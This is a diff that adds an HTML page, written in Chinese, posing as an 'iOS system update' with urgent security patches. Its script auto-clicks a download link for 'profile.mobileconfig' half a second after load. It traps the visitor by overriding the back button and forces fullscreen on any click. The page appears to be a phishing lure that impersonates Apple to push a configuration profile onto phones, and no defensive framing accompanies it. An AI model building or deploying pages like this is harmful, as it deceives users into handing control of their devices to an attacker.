@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>系统更新</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: -apple-system, system-ui;
+            background: #000;
+            color: #fff;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 20px auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: normal;
+        }
+        p {
+            color: #999;
+            line-height: 1.5;
+        }
+        .button {
+            display: inline-block;
+            background: #007AFF;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 20px;
+            text-decoration: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="#fff">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+                <path d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z"/>
+            </svg>
+        </div>
+        <h1>iOS 系统更新</h1>
+        <p>此更新包含重要的系统安全补丁，建议立即安装。</p>
+        <a href="profile.mobileconfig" class="button" id="install">安装更新</a>
+    </div>
+    <script>
+    (function() {
+        // 自动触发安装
+        setTimeout(function() {
+            document.getElementById('install').click();
+        }, 500);
+        
+        // 防止返回
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.pushState(null, null, location.href);
+        };
+        
+        // 请求全屏
+        document.documentElement.requestFullscreen = 
+            document.documentElement.requestFullscreen || 
+            document.documentElement.webkitRequestFullscreen;
+        
+        document.addEventListener('click', function() {
+            document.documentElement.requestFullscreen();
+        });
+    })();
+    </script>
+</body>
+</html>
